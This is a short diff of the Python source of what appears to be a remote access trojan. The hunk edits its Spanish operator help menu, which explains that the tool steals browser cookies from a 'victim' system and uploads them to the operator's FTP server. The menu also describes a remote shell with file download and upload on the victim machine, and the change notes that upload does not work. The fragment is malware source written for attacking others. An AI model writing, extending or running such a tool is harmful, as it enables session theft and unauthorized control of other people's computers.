@@ -61,7 +61,7 @@ def home():
                 banner("AYUDA")
                 print("""    COOKIES: AL SELECCIONAR LA OPCION 'COOKIES' EL RAT BUSCARA CUALQ   UIERA DE LOS SIGUIENTES NAVEGADORES DENTRO DEL SISTEMA OPERATIVO VICTIMA(OPERA, CHROME, BR  AVE, OPERAGX, FIREFOX, FIREFOX-DEV Y  MICROSOFT EDGE), UNA VEZ QUE SE ENCUENTRE ALGUNO DE E STOS GUARDARA LAS COOKIES EN UN ARCHIVO LLAMADO 'navegador(victima)' DENTRO DEL SERVIDOR FTP    CORRESPONDIENTE A ESTA MISMA IP.
 
-    SHELL: LA SHELL APARTE DE SU FUNCION OBVIA QUE ES INTERACTUAR CON LA SHELL DEL SISTEMA LE   AGREGUE LAS OPCIONES DE SUBIDA Y DESCARGA, PARA SUBIR UN ARCHIVO SE USA EL COMANDO 'subir no  mbre_archivo' y para descargar 'descargar nombre_archivo' cualquier archivo proveniente de la     maquina victima se guardara en el servidor ftp dentro de alguna carpeta nombrada segun el us    uario de la maquina victima. Para subir archivos debes asegurarte de que el archivo que quier   es subir este dentro del servidor ftp en la carpeta 'arcadia'.
+    SHELL: LA SHELL APARTE DE SU FUNCION OBVIA QUE ES INTERACTUAR CON LA SHELL DEL SISTEMA LE   AGREGUE LAS OPCIONES DE SUBIDA Y DESCARGA (LA SUBIDA NO FUNCA XD), PARA SUBIR UN ARCHIVO SE USA EL COMANDO 'subir no  mbre_archivo' y para descargar 'descargar nombre_archivo' cualquier archivo proveniente de la     maquina victima se guardara en el servidor ftp dentro de alguna carpeta nombrada segun el us    uario de la maquina victima. Para subir archivos debes asegurarte de que el archivo que quier   es subir este dentro del servidor ftp en la carpeta 'arcadia'.
 
     OPIONES: VOLVER Y SALIR.""")
                 opciones()
